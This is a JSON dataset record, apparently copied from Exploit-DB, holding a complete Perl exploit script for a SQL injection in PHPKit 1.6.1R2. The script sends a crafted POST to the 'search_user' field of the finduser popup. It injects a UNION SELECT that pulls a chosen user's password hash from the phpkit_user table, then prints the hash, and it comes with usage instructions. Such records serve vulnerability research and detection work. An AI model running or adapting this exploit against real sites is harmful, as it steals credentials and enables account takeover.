{
  "id": "2714",
  "title": "PHPKIT 1.6.1R2 - &#039;search_user&#039; SQL Injection",
  "cve": null,
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n\r\nuse IO::Socket;\r\n\r\nprint q{\r\n-----------------------------------------------\r\nPHPKit 1.6.1 exploit by x23 ~ phcn.ws ~ geek-network.de\r\nuse: phpkit161.pl [server] [dir] [vic_id]\r\nsample:\r\n$ perl phpkit161.pl localhost /phpkit/ 1\r\n-----------------------------------------------\r\n\r\n};\r\n\r\n$webpage =   $ARGV[0];\r\n$directory = $ARGV[1];\r\n$vic_id =    $ARGV[2];\r\n\r\nif (!$vic_id) { die \"~ read how to use ;)\\n\"; }\r\n\r\nprint \"~ connecting\\n\";\r\n$sock = IO::Socket::INET->new(Proto=>\"tcp\", PeerAddr=>\"$webpage\", PeerPort=>\"80\") || die \"[+] Can't connect to Server\\n\";\r\n\r\nprint \"~ exploiting\\n\";\r\nprint $sock \"POST \".$directory.\"popup.php?path=misc/finduser.php HTTP/1.1\\r\\n\";\r\nprint $sock \"Host: $webpage\\r\\n\";\r\nprint $sock \"Keep-Alive: 300\\r\\n\";\r\nprint $sock \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\nprint $sock \"Content-Length: \".length(\"search_user=%27+AND+1%3D0+UNION+SELECT+user_pw+FROM+phpkit_user+WHERE+user_id%3D\".$vic_id.\"%2F*&action=Suche&User=-1\").\"\\r\\n\\r\\n\";\r\n\r\nprint $sock \"search_user=%27+AND+1%3D0+UNION+SELECT+user_pw+FROM+phpkit_user+WHERE+user_id%3D\".$vic_id.\"%2F*&action=Suche&User=-1\";\r\n\r\nwhile ($answer = <$sock>) {\r\n  #print $answer;\r\n  if ($answer =~/<option value=\"([0-9a-f]{32})\">/) {\r\n     print \"~ hash: $1\\n\";\r\n     close($sock);\r\n     exit();\r\n     break;\r\n  }\r\n}\r\n\r\nclose($sock);\r\n\r\n# milw0rm.com [2006-11-04]",
  "url": "https://www.exploit-db.com/exploits/2714"
}